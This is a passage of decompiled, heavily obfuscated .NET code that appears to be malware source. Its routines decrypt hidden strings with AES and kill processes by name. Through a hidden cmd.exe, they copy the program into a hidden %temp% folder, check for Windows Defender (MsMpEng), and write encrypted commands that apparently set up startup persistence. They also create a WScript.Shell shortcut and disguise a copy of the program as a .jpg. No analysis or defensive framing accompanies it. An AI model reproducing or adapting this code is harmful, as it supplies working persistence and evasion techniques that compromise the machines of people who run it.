		for (int i = 0; i < class39_0.short_0.Length; i++)
		{
			num += class39_0.short_0[i] * class39_0.byte_0[i];
		}
		return num;
	}

	static void smethod_102(Form0 form0_0)
	{
		try
		{
			((Control)form0_0.panel_2).set_Visible(false);
			int num = 2;
			if (!IwxRFxvB9dB3g1fRikX())
			{
			}
			while (true)
			{
				switch (num)
				{
				case 0:
				case 2:
					((Control)form0_0.panel_1).set_Visible(true);
					goto default;
				default:
					if (form0_0.eventArgs1_0 != null)
					{
						num = 4;
						if (v2IJBhvCyRSyXwG8iyi())
						{
							break;
						}
						goto case 0;
					}
					return;
				case 4:
					Class58.smethod_106((ThreadStart)form0_0.method_10, form0_0);
					return;
				}
			}
		}
		catch
		{
		}
	}

	static void smethod_103(IWebProxy iwebProxy_0, Class54 class54_0)
	{
		class54_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_104()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("9p12f/nXPDi4YbupHn4TFQ== ");
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	static void smethod_105(Class45 class45_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class58.smethod_152(class45_0, tempFileName);
			string path = Class58.smethod_64();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class45_0.eventHandler_0 != null)
			{
				class45_0.eventHandler_0(class45_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class58.smethod_15(new EventArgs0(fatalException), class45_0);
		}
	}

	static void smethod_106(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_107(Class31.Class40 class40_0)
	{
		class40_0.int_0 = (class40_0.byte_0[class40_0.int_4] << 5) ^ class40_0.byte_0[class40_0.int_4 + 1];
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32.dll")]
	internal static extern short GetVersionEx(ref Class57.Struct24 struct24_0);

	static void smethod_108(Class31.Class38.Class39 class39_0)
	{
		int[] array = new int[class39_0.int_3];
		int num = 0;
		class39_0.short_1 = new short[class39_0.short_0.Length];
		for (int i = 0; i < class39_0.int_3; i++)
		{
			array[i] = num;
			num += class39_0.int_2[i] << 15 - i;
		}
		for (int j = 0; j < class39_0.int_1; j++)
		{
			int num2 = class39_0.byte_0[j];
			if (num2 > 0)
			{
				class39_0.short_1[j] = Class58.smethod_33(array[num2 - 1]);
				array[num2 - 1] += 1 << 16 - num2;
			}
		}
	}

	static string smethod_109(string string_0)
	{
		string s = "过过港很老八起豆";
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			while (true)
			{
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
				Array.Copy(sourceArray, 0, array, 0, 10);
				int num = 5;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					break;
				}
				while (true)
				{
					switch (num)
					{
					case 1:
					case 5:
						Array.Copy(sourceArray, 0, array, 15, 10);
						rijndaelManaged.Key = array;
						goto default;
					default:
						rijndaelManaged.Mode = CipherMode.ECB;
						goto case 0;
					case 0:
					case 3:
					{
						ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
						byte[] array2 = Convert.FromBase64String(string_0);
						text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
						num = 6;
						if (!IwxRFxvB9dB3g1fRikX())
						{
							continue;
						}
						break;
					}
					case 2:
						break;
					case 6:
						goto end_IL_0099;
					}
					break;
				}
				continue;
				end_IL_0099:
				break;
			}
			result = text;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static Icon smethod_110()
	{
		while (true)
		{
			int int_ = 0;
			while (true)
			{
				int int_2 = 0;
				int num = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
				if (IwxRFxvB9dB3g1fRikX())
				{
					break;
				}
				switch (4)
				{
				case 0:
				case 1:
					continue;
				case 5:
					break;
				case 4:
					if (num > 0)
					{
						ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
						goto default;
					}
					goto IL_0062;
				default:
					if (int_ == 0)
					{
						goto IL_0062;
					}
					goto case 6;
				case 6:
					{
						return Icon.FromHandle(new IntPtr(int_));
					}
					IL_0062:
					return null;
				}
				break;
			}
		}
	}

	static int smethod_111(Class31.Class35 class35_0, Class31.Class33 class33_0)
	{
		int num2;
		int num;
		if ((num = Class58.smethod_10(class33_0, 9)) >= 0)
		{
			int num3;
			int availableBits;
			int result = default(int);
			while (true)
			{
				if ((num2 = class35_0.short_0[num]) < 0)
				{
					num3 = -(num2 >> 4);
					while (true)
					{
						int int_ = num2 & 0xF;
						while (true)
						{
							if ((num = Class58.smethod_10(class33_0, int_)) < 0)
							{
								availableBits = class33_0.AvailableBits;
								num = Class58.smethod_10(class33_0, availableBits);
								if (v2IJBhvCyRSyXwG8iyi())
								{
									switch (6)
									{
									case 7:
										break;
									case 1:
									case 4:
										goto end_IL_0068;
									case 0:
									case 5:
										goto end_IL_0076;
									case 6:
										goto end_IL_007d;
									case 3:
										goto IL_0106;
									case 8:
										goto IL_010a;
									default:
										goto IL_0128;
									}
									continue;
								}
								goto IL_0128;
							}
							num2 = class35_0.short_0[num3 | (num >> 9)];
							Class58.smethod_28(class33_0, num2 & 0xF);
							return num2 >> 4;
							IL_0128:
							return result;
							continue;
							end_IL_0068:
							break;
						}
						continue;
						end_IL_0076:
						break;
					}
					continue;
				}
				Class58.smethod_28(class33_0, num2 & 0xF);
				return num2 >> 4;
				continue;
				end_IL_007d:
				break;
			}
			num2 = class35_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= availableBits)
			{
				Class58.smethod_28(class33_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int availableBits2 = class33_0.AvailableBits;
		num = Class58.smethod_10(class33_0, availableBits2);
		num2 = class35_0.short_0[num];
		goto IL_0106;
		IL_0123:
		return -1;
		IL_0106:
		if (num2 >= 0)
		{
			goto IL_010a;
		}
		goto IL_0123;
		IL_010a:
		if ((num2 & 0xF) <= availableBits2)
		{
			Class58.smethod_28(class33_0, num2 & 0xF);
			return num2 >> 4;
		}
		goto IL_0123;
	}

	static void smethod_112(Exception exception_0)
	{
		Class58.smethod_19(exception_0, new object[0]);
	}

	static void smethod_113()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 228:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_004c;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_0082;
						case 8:
							goto IL_008c;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_008c:
					num = 8;
					processStartInfo.CreateNoWindow = true;
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_004c;
					IL_004c:
					num = 4;
					text3 = "cm";
					goto IL_0055;
					IL_0055:
					num = 5;
					if (Class58.smethod_18("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0064;
					IL_0064:
					num = 6;
					processStartInfo = new ProcessStartInfo(text2 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\9p12f/nXPDi4YbupHn4TFQ==.bat");
					goto IL_0082;
					IL_0082:
					num = 7;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_008c;
					end_IL_0000_2:
					break;
				}
				num = 9;
				Process.Start(processStartInfo);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 228;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_114(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class58.smethod_19(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static int smethod_115(string string_0, Class45 class45_0)
	{
		try
		{
			bool flag = class45_0.char_0[0] == '\u0001';
			bool flag2 = default(bool);
			int num2 = default(int);
			int num3 = default(int);
			char c = default(char);
			int i = default(int);
			while (string_0 != null)
			{
				while (string_0.Length != 0 && (!flag || string_0.Length <= 4))
				{
					while (true)
					{
						IL_00ff:
						int num;
						if (!flag)
						{
							num = 4;
							if (v2IJBhvCyRSyXwG8iyi())
							{
								goto IL_007e;
							}
							goto IL_00b7;
						}
						goto IL_00e2;
						IL_00ad:
						if (!flag2)
						{
							num = 7;
							if (!IwxRFxvB9dB3g1fRikX())
							{
								goto IL_007e;
							}
							goto IL_00d5;
						}
						num2--;
						goto IL_00cb;
						IL_00e2:
						num3 = 0;
						num2 = string_0.Length - 1;
						goto IL_00cb;
						IL_00cb:
						if (num2 >= 0 && (flag || num2 != 0))
						{
							c = string_0[num2];
							flag2 = false;
							i = 0;
							goto IL_00b7;
						}
						goto IL_011d;
						IL_011d:
						return num3;
						IL_00d5:
						if (string_0[0] != '#')
						{
							goto end_IL_0111;
						}
						goto IL_00e2;
						IL_007e:
						while (true)
						{
							switch (num)
							{
							default:
								num = 1;
								if (v2IJBhvCyRSyXwG8iyi())
								{
									continue;
								}
								goto IL_011d;
							case 5:
								break;
							case 1:
								goto IL_00b7;
							case 3:
							case 4:
								goto IL_00d5;
							case 8:
								goto IL_00ff;
							case 0:
								goto end_IL_00ff;
							case 2:
								goto IL_0111;
							case 6:
							case 7:
								return -1;
							case 9:
								goto IL_011d;
							}
							break;
						}
						goto IL_00ad;
						IL_00b7:
						for (; i < class45_0.char_0.Length; i++)
						{
							if (class45_0.char_0[i] == c)
							{
								num3 = num3 * class45_0.char_0.Length + i;
								flag2 = true;
								break;
							}
						}
						goto IL_00ad;
						continue;
						end_IL_00ff:
						break;
					}
				}
				break;
				continue;
				end_IL_0111:
				break;
				IL_0111:;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static void smethod_116(byte[] byte_0, Class31.Class38.Class39 class39_0, short[] short_0)
	{
		class39_0.short_1 = short_0;
		class39_0.byte_0 = byte_0;
	}

	static int smethod_117(Class31.Class33 class33_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class33_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class33_0.uint_0;
			class33_0.uint_0 >>= 8;
			class33_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class33_0.int_1 - class33_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class33_0.byte_0, class33_0.int_0, byte_0, int_0, int_1);
		class33_0.int_0 += int_1;
		if (((uint)(class33_0.int_0 - class33_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class33_0.uint_0 = class33_0.byte_0[class33_0.int_0++] & 0xFFu;
			class33_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_118(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class58.smethod_19(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_119(int[] int_0, Class31.Class38.Class39 class39_0)
	{
		class39_0.byte_0 = new byte[class39_0.short_0.Length];
		int num = int_0.Length / 2;
		int num2 = (num + 1) / 2;
		int num3 = 0;
		for (int i = 0; i < class39_0.int_3; i++)
		{
			class39_0.int_2[i] = 0;
		}
		int[] array = new int[num];
		array[num - 1] = 0;
		for (int num4 = num - 1; num4 >= 0; num4--)
		{
			if (int_0[2 * num4 + 1] != -1)
			{
				int num5 = array[num4] + 1;
				if (num5 > class39_0.int_3)
				{
					num5 = class39_0.int_3;
					num3++;
				}
				array[int_0[2 * num4]] = (array[int_0[2 * num4 + 1]] = num5);
			}
			else
			{
				int num6 = array[num4];
				class39_0.int_2[num6 - 1]++;
				class39_0.byte_0[int_0[2 * num4]] = (byte)array[num4];
			}
		}
		if (num3 == 0)
		{
			return;
		}
		int num7 = class39_0.int_3 - 1;
		while (true)
		{
			if (class39_0.int_2[--num7] != 0)
			{
				do
				{
					class39_0.int_2[num7]--;
					class39_0.int_2[++num7]++;
					num3 -= 1 << class39_0.int_3 - 1 - num7;
				}
				while (num3 > 0 && num7 < class39_0.int_3 - 1);
				if (num3 <= 0)
				{
					break;
				}
			}
		}
		class39_0.int_2[class39_0.int_3 - 1] += num3;
		class39_0.int_2[class39_0.int_3 - 2] -= num3;
		int num8 = 2 * num2;
		for (int num9 = class39_0.int_3; num9 != 0; num9--)
		{
			int num10 = class39_0.int_2[num9 - 1];
			while (num10 > 0)
			{
				int num11 = 2 * int_0[num8++];
				if (int_0[num11 + 1] == -1)
				{
					class39_0.byte_0[int_0[num11]] = (byte)num9;
					num10--;
				}
			}
		}
	}

	static int smethod_120(Class31.Class34 class34_0, Class31.Class33 class33_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class34_0.int_1), class33_0.AvailableBytes);
		int num2 = default(int);
		if (v2IJBhvCyRSyXwG8iyi())
		{
			int num = default(int);
			switch (0)
			{
			case 0:
				num = 32768 - class34_0.int_0;
				if (int_0 <= num)
				{
					num2 = Class58.smethod_117(class33_0, class34_0.byte_0, class34_0.int_0, int_0);
					break;
				}
				goto case 1;
			case 1:
			case 5:
				num2 = Class58.smethod_117(class33_0, class34_0.byte_0, class34_0.int_0, num);
				if (num2 != num)
				{
					break;
				}
				goto default;
			default:
				num2 += Class58.smethod_117(class33_0, class34_0.byte_0, 0, int_0 - num);
				break;
			case 3:
			case 4:
				break;
			case 6:
				goto IL_00c5;
			}
		}
		class34_0.int_0 = (class34_0.int_0 + num2) & 0x7FFF;
		class34_0.int_1 += num2;
		goto IL_00c5;
		IL_00c5:
		return num2;
	}

	static string smethod_121(string string_0, Form1 form1_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static bool smethod_122(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class45_0.method_7();
	}

	static void smethod_123()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		string text = default(string);
		object executablePath = default(object);
		StreamWriter standardInput = default(StreamWriter);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text10;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 2039:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0035;
						case 4:
							goto IL_0058;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_0098;
						case 7:
							goto IL_00b2;
						case 8:
							goto IL_00cc;
						case 9:
							goto IL_00d5;
						case 10:
							goto IL_0139;
						case 11:
							goto IL_014e;
						case 12:
							goto IL_015f;
						case 13:
							goto IL_0170;
						case 14:
							goto IL_0181;
						case 15:
							goto IL_0192;
						case 16:
							goto IL_01a3;
						case 17:
							goto IL_01af;
						case 18:
							goto IL_01bb;
						case 19:
							goto IL_01c5;
						case 20:
							goto IL_01d0;
						case 21:
							goto IL_01db;
						case 22:
							goto IL_01e6;
						case 23:
							goto IL_01f1;
						case 24:
							goto IL_0270;
						case 25:
							goto IL_0280;
						case 26:
							goto IL_02e4;
						case 28:
							goto IL_02f7;
						case 29:
							goto IL_02fb;
						case 30:
							goto IL_0365;
						case 31:
							goto IL_0370;
						case 32:
							goto IL_0382;
						case 33:
							goto IL_039c;
						case 34:
							goto IL_03bd;
						case 35:
							goto IL_0426;
						case 36:
							goto IL_048a;
						case 37:
							goto IL_04ee;
						case 38:
							goto IL_0515;
						case 39:
							goto IL_0531;
						case 40:
							goto IL_054d;
						case 27:
						case 41:
						case 42:
							goto IL_05b6;
						case 43:
							goto IL_060f;
						case 44:
							goto IL_0672;
						case 45:
						case 46:
							goto IL_06df;
						case 47:
							goto IL_06f8;
						case 48:
							goto IL_0703;
						case 49:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 50:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0703:
					num = 48;
					process.Kill();
					break;
					IL_0008:
					num = 2;
					text = "" + Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0035;
					IL_0035:
					num = 3;
					text2 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0058;
					IL_0058:
					num = 4;
					process = new Process();
					goto IL_0062;
					IL_0062:
					num = 5;
					text3 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=") + Class58.smethod_109("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==");
					goto IL_0098;
					IL_0098:
					num = 6;
					Directory.CreateDirectory(text + Class58.smethod_109("fEzc44351CMchjFeeY23eA=="));
					goto IL_00b2;
					IL_00b2:
					num = 7;
					File.SetAttributes(text + Class58.smethod_109("fEzc44351CMchjFeeY23eA=="), FileAttributes.Hidden);
					goto IL_00cc;
					IL_00cc:
					num = 8;
					executablePath = Application.get_ExecutablePath();
					goto IL_00d5;
					IL_00d5:
					num = 9;
					text4 = "" + Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==");
					goto IL_0139;
					IL_0139:
					num = 10;
					process.StartInfo.FileName = "cmd.exe";
					goto IL_014e;
					IL_014e:
					num = 11;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_015f;
					IL_015f:
					num = 12;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_0170;
					IL_0170:
					num = 13;
					process.StartInfo.UseShellExecute = false;
					goto IL_0181;
					IL_0181:
					num = 14;
					process.StartInfo.CreateNoWindow = true;
					goto IL_0192;
					IL_0192:
					num = 15;
					process.StartInfo.RedirectStandardError = true;
					goto IL_01a3;
					IL_01a3:
					num = 16;
					process.Start();
					goto IL_01af;
					IL_01af:
					num = 17;
					standardInput = process.StandardInput;
					goto IL_01bb;
					IL_01bb:
					num = 18;
					text5 = "cop";
					goto IL_01c5;
					IL_01c5:
					num = 19;
					text6 = "y ";
					goto IL_01d0;
					IL_01d0:
					num = 20;
					standardInput.AutoFlush = true;
					goto IL_01db;
					IL_01db:
					num = 21;
					text7 = "%temp%\\";
					goto IL_01e6;
					IL_01e6:
					num = 22;
					text8 = ".lnk";
					goto IL_01f1;
					IL_01f1:
					num = 23;
					standardInput.Write(text5 + text6 + "\"" + Application.get_ExecutablePath() + "\" \"" + text7 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + "\" /Y" + Environment.NewLine);
					goto IL_0270;
					IL_0270:
					num = 24;
					if (Class58.smethod_18("MsMpEng"))
					{
						goto IL_0280;
					}
					goto IL_02f7;
					IL_0280:
					num = 25;
					standardInput.Write(Class58.smethod_109("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV") + text7 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + "\" /f" + Environment.NewLine);
					goto IL_02e4;
					IL_02e4:
					num = 26;
					Thread.Sleep(7000);
					goto IL_05b6;
					IL_02f7:
					num = 28;
					goto IL_02fb;
					IL_02fb:
					num = 29;
					standardInput.Write(Class58.smethod_109("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV") + text7 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + text8 + "\" /f" + Environment.NewLine);
					goto IL_0365;
					IL_0365:
					num = 30;
					text9 = "WScrip";
					goto IL_0370;
					IL_0370:
					num = 31;
					text10 = text9 + "t.Shell";
					goto IL_0382;
					IL_0382:
					num = 32;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("", ""));
					goto IL_039c;
					IL_039c:
					num = 33;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(text9 + "t.Shell", ""));
					goto IL_03bd;
					IL_03bd:
					num = 34;
					objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + text8 }, (string[])null, (Type[])null, (bool[])null));
					goto IL_0426;
					IL_0426:
					num = 35;
					NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_048a;
					IL_048a:
					num = 36;
					NewLateBinding.LateSet(obj, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_04ee;
					IL_04ee:
					num = 37;
					NewLateBinding.LateSet(objectValue2, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_0515;
					IL_0515:
					num = 38;
					NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_0531;
					IL_0531:
					num = 39;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_054d;
					IL_054d:
					num = 40;
					standardInput.Write(Class58.smethod_109("tooEKUPNPCsRNkaS3Hueqar3hTgD3+UMaiKlVz9fNin2nXZ/+dc8OLhhu6kefhMV") + text7 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + Class58.smethod_109("N2125ojyLfd5vRuYzSjpwfaddn/51zw4uGG7qR5+ExU=") + Environment.NewLine);
					goto IL_05b6;
					IL_05b6:
					num = 42;
					if (!File.Exists(Interaction.Environ("TEMP") + "\\" + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==")))
					{
						goto IL_060f;
					}
					goto IL_06df;
					IL_060f:
					num = 43;
					File.Copy(Conversions.ToString(executablePath), Interaction.Environ("TEMP") + "\\" + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + ".jpg");
					goto IL_0672;
					IL_0672:
					num = 44;
					standardInput.Write("ren \"" + text7 + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + ".jpg\" " + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + Environment.NewLine);
					goto IL_06df;
					IL_06df:
					num = 46;
					standardInput.Write("exit" + Environment.NewLine);
					goto IL_06f8;
					IL_06f8:
					num = 47;
					process.WaitForExit();
					goto IL_0703;
					end_IL_0000_2:
					break;
				}
				num = 49;
				standardInput.Flush();
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 2039;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static int smethod_124(Class31.Class41 class41_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class41_0.int_2 >= 8)
		{
			class41_0.byte_0[class41_0.int_1++] = (byte)class41_0.uint_0;
			class41_0.uint_0 >>= 8;
			class41_0.int_2 -= 8;
		}
		if (int_1 > class41_0.int_1 - class41_0.int_0)
		{
			int_1 = class41_0.int_1 - class41_0.int_0;
			Array.Copy(class41_0.byte_0, class41_0.int_0, byte_0, int_0, int_1);
			class41_0.int_0 = 0;
			class41_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class41_0.byte_0, class41_0.int_0, byte_0, int_0, int_1);
			class41_0.int_0 += int_1;
		}
		return int_1;
	}

	static void smethod_125(int int_0, Class31.Class38 class38_0)
	{
		Class58.smethod_108(class38_0.class39_2);
		Class58.smethod_108(class38_0.class39_0);
		Class58.smethod_108(class38_0.class39_1);
		Class58.smethod_83(class38_0.class41_0, class38_0.class39_0.int_1 - 257, 5);
		Class58.smethod_83(class38_0.class41_0, class38_0.class39_1.int_1 - 1, 5);
		Class58.smethod_83(class38_0.class41_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class58.smethod_83(class38_0.class41_0, (int)class38_0.class39_2.byte_0[Class31.Class38.int_0[i]], 3);
		}
		Class58.smethod_26(class38_0.class39_0, class38_0.class39_2);
		Class58.smethod_26(class38_0.class39_1, class38_0.class39_2);
	}

	static bool smethod_126(Class31.Class36 class36_0, Class31.Class33 class33_0)
	{
		int int_2 = default(int);
		int num3 = default(int);
		int num = default(int);
		bool result = default(bool);
		while (true)
		{
			int int_ = class36_0.int_2;
			while (true)
			{
				int num2;
				switch (int_)
				{
				case 5:
					int_2 = Class31.Class36.int_1[class36_0.int_7];
					num3 = Class58.smethod_10(class33_0, int_2);
					num2 = 10;
